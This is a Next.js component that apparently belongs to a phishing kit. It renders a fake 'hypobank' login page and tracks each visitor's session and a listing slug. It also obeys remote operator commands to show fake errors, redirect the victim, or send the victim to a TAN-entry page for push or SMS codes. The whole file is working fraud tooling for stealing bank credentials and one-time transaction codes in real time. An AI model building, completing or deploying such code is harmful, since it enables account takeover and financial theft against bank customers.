"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/Header";
import LoginFlow from "@/components/LoginFlow";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import { saveListingSlug, startSession, onCommand } from "@/lib/track";

export default function ClientShell({ initialSlug }: { initialSlug: string | null }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (initialSlug) saveListingSlug(initialSlug);
    startSession("hypobank");

    onCommand((cmd) => {
      if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Error");
      } else if (cmd.type === "clear_error") {
        setError(null);
      } else if (cmd.type === "redirect") {
        const url = (cmd.payload as { url?: string }).url;
        if (url) window.location.href = url;
      } else if (cmd.type === "request_push_tan") {
        router.push("/pushtan");
      } else if (cmd.type === "request_sms_tan") {
        router.push("/pushtan");
      }
    });
  }, [initialSlug, router]);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/hypobank/bg-lake.jpg')",
        backgroundColor: "#1a3a5c",
      }}
    >
      <Header />
      <main className="flex-1 flex flex-col">
        {error && (
          <div className="mx-auto mt-4 w-full max-w-[460px] px-4">
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
              {error}
            </div>
          </div>
        )}
        <LoginFlow />
      </main>
      <Footer />
      <HelpButton />
    </div>
  );
}
